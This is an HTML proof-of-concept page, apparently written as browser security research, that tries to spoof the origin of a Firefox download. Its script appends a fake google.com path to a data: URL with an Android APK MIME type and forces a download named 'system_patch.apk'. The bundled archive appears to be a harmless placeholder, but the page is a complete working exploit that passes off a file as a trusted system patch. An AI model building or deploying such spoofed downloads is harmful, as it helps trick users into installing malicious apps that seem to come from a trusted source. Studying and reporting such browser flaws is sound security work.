<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firefox Origin Spoofing + APK Fix</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 50px; }
        .card { background: #2d2d2d; border-radius: 12px; padding: 30px; border: 1px solid #444; display: inline-block; }
        button { 
            background: #ff5252; color: white; padding: 15px 30px; border: none; 
            border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
        }
        #log { margin-top: 20px; color: #00e676; font-family: monospace; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Firefox Security Research</h2>
        <p>Testing Authority Injection with APK Payload</p>
        <button onclick="runSpoof()">Trigger Spoofed Download</button>
        <div id="log">Status: Ready</div>
    </div>

    <script>
        function runSpoof() {
            const log = document.getElementById('log');
            log.innerText = "Status: Triggering...";

            // Payload APK minimalis (Magic Bytes PK..) agar Firefox tidak mengubah ke .txt
            const apkBase64 = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";

            // Menggunakan teknik Authority Injection yang kamu temukan
            // Struktur: data:[MIME];base64,[DATA]/\\//google.com/
            const spoofedURL = "data:application/vnd.android.package-archive;base64," + apkBase64 + "/\\\\\\/.google.com/application/x-msdownload";

            const a = document.createElement("a");
            a.href = spoofedURL;
            a.download = "system_patch.apk";
            
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            log.innerText = "Status: Download triggered! Check extension and origin.";
        }
    </script>
</body>
</html>
